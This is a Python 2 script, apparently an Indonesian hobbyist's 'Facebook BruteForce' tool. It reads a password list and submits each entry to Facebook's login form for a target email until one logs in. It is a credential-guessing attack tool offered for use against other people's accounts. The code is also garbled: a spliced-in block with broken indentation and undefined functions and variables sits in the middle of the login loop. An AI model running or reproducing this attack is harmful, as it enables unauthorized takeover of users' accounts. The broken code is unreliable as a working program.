import time

import sys


if sys.version_info[0] !=2: 

	print('''- - - - - - - - - - - - - - - - - - - -

	REQUIRED PYTHON 2.x

	use: python fbrute.py

- - - - - - - - - - - - - - - - - - - -

			''')

	sys.exit()


post_url='https://www.facebook.com/login.php'

headers = {

	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',

}


try:

	import mechanize

	import urllib2

	browser = mechanize.Browser()

	browser.addheaders = [('User-Agent',headers['User-Agent'])]

	browser.set_handle_robots(False)

except:

	print('\n\tPlease install mechanize.\n')

	sys.exit()
#Warna
B = '\033[1m' #Bold
R = '\033[31m' #Red
G = '\033[32m' #Green
Y = '\033[33m' #Yellow
BL = '\033[34m' #Blue
P = '\033[35m' #Purple
W = '\033[37m' #White
U = '\033[2m' #Underline
N = '\033[0m' #Normal

print B+G+""
print " = = = = = Welcome To Facebook BruteForce = = = = = "

print B+G+''
print '     bruteforce      '
print '      \      / '
print '      _\____/_ '
print '     |        |'
print '     | o    o |'
print '     |        |'
print '     |  [fb]  |'

print B+BL+" #-----------------------------------------# "
print B+R+"               \!/WARNING\!/ "
print B+R+" hargai pembuat coding ngga gampang!!! "
print B+BL+" #-----------------------------------------# "

file=open('passwords.txt','r')


email=str(raw_input('Enter Email/Username : ').strip())


print "\nTarget Email\ID : ",email

print "\nTrying Passwords from list ..."


i=0

while file:

	passw=file.readline().strip()

	i+=1

	print str(i) +" : ",passw

	response = browser.open(post_url)

	try:

		if response.code == 200:

			browser.select_form(nr=0)

			browser.form['email'] = email

			browser.form['pass'] = passw

			response = browser.submit()

 url = br.geturl()

	if 'save-device' in url or 'm_sess' in url:

		tampil('\rh[*]Login Berhasil')

		buka('https://mobile.facebook.com/home.php')

		nama = br.find_link(url_regex='logout.php').text

		nama = re.findall(r'\((.*a?)\)',nama)[0]

		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]'%nama)

			if 'Find Friends' in response.read():

				print('Your password is : ',passw)

				break

	except:

		print('\nSleeping for time : 10 sec\n')

		time.sleep(10)

        print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m ')
        
